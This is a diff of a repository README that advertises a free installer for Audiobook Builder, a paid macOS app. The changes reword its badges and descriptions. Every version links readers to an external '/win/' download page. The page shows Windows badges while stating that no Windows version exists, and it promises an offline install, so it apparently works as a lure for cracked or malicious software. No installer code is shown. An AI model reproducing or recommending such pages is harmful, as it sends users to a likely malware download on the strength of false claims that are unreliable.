@@ -5,10 +5,10 @@
   <img src="https://img.shields.io/badge/Rating-4.9%2F5-F9A825?style=for-the-badge&logo=star" />
   <img src="https://img.shields.io/badge/Version-2026-101010?style=for-the-badge&logo=github" />
   <img src="https://img.shields.io/badge/Platform-Windows%20%7C%20macOS-informational?style=for-the-badge&logo=windows" />
-  <img src="https://img.shields.io/badge/Category-Audiobook+Creator-E63946?style=for-the-badge&logo=appstore" />
+  <img src="https://img.shields.io/badge/Category-Audiobook+Tool-E63946?style=for-the-badge&logo=appstore" />
 </p>
 
-**💻 Audiobook Builder Free Installer** — Audiobook Builder is a macOS app for creating M4B audiobooks from MP3 or AAC files. Works without internet access, no account required. Full offline installation.
+**💻 Audiobook Builder Free Installer** — Audiobook Builder is a macOS application for creating audiobooks from audio files. Works without internet access, no account required. Full offline installation.
 
 <p align="center">
   <img src="https://skillicons.dev/icons?i=windows" />
@@ -22,7 +22,7 @@
 
 <div align="center">
 
-[![⬇ Install Audiobook Builder](https://img.shields.io/badge/⬇_Install_Audiobook%20Builder-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install Audiobook Builder](https://img.shields.io/badge/⬇_Install_Audiobook+Builder-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
@@ -30,16 +30,16 @@
 
 ## 📖 About Audiobook Builder
 
-Audiobook Builder is a macOS app for creating M4B audiobooks from MP3 or AAC files. It supports chapter marks, cover art, metadata, and automatic track joining — turning collections of audio files into a single professionally formatted audiobook file.
+Audiobook Builder is a macOS application for creating audiobooks from audio files. Import MP3, AAC, or other audio formats and merge them into a single M4B audiobook with chapters, cover art, and metadata. Designed for personal audiobook creation from ripped CDs or downloaded audio content, Audiobook Builder makes it easy to listen to long-form audio on iPhone, iPad, or Mac.
 
 ---
 
 ## ❌ Problem: Audiobook Builder is hard to access
 
-- **macOS Only** — No Windows or Linux version available
-- **Paid App** — Requires purchase from Mac App Store
-- **Single Purpose** — Very specific use case: creating M4B audiobooks from existing audio files
-- **M4B Format** — Output format best for Apple devices; Android compatibility varies
+- **macOS Only** — No Windows version available
+- **Manual Chapter Setup** — Chapters must be set manually for complex projects
+- **iTunes Dependency** — Syncing to iOS devices traditionally required iTunes
+- **No Streaming Export** — Output limited to local audiobook files
 
 ---
 
@@ -81,7 +81,7 @@ Audiobook Builder is a macOS app for creating M4B audiobooks from MP3 or AAC fil
 
 <div align="center">
 
-[![⬇ Install Audiobook Builder](https://img.shields.io/badge/⬇_Install_Audiobook%20Builder-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install Audiobook Builder](https://img.shields.io/badge/⬇_Install_Audiobook+Builder-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
@@ -121,11 +121,11 @@ Audiobook Builder is a macOS app for creating M4B audiobooks from MP3 or AAC fil
 
 ---
 
-**Audiobook Builder Free Installer** — Audiobook Builder is a macOS app for creating M4B audiobooks from MP3 or AAC files. Install without internet connection today!
+**Audiobook Builder Free Installer** — Audiobook Builder is a macOS application for creating audiobooks from audio files. Install without internet connection today!
 
 <div align="center">
 
-[![⬇ Install Audiobook Builder](https://img.shields.io/badge/⬇_Install_Audiobook%20Builder-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install Audiobook Builder](https://img.shields.io/badge/⬇_Install_Audiobook+Builder-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
